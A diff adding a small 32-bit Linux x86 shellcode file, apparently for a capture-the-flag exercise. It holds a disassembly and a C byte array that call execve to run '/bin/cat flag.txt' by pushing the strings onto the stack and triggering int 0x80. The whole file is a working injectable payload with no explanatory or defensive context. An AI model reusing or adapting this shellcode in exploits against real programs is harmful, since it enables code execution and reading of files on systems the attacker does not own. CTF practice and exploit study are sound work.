@@ -1,0 +1,26 @@
+/*execve("/bin/cat flag.txt")*/
+
+ 80483df:	31 d2                	xor    %edx,%edx
+ 80483e1:	52                   	push   %edx
+ 80483e2:	68 2e 74 78 74       	push   $0x7478742e
+ 80483e7:	68 66 6c 61 67       	push   $0x67616c66
+ 80483ec:	89 e0                	mov    %esp,%eax
+ 80483ee:	52                   	push   %edx
+ 80483ef:	68 2f 63 61 74       	push   $0x7461632f
+ 80483f4:	68 2f 62 69 6e       	push   $0x6e69622f
+ 80483f9:	89 e3                	mov    %esp,%ebx
+ 80483fb:	52                   	push   %edx
+ 80483fc:	50                   	push   %eax
+ 80483fd:	53                   	push   %ebx
+ 80483fe:	89 e1                	mov    %esp,%ecx
+ 8048400:	8d 42 0b             	lea    0xb(%edx),%eax
+ 8048403:	cd 80                	int    $0x80
+
+
+
+char cat_flag [] =
+
+"\x31\xd2\x52\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe0\x52"
+"\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x50\x53\x89"
+"\xe1\x8d\x42\x0b\xcd\x80"
+
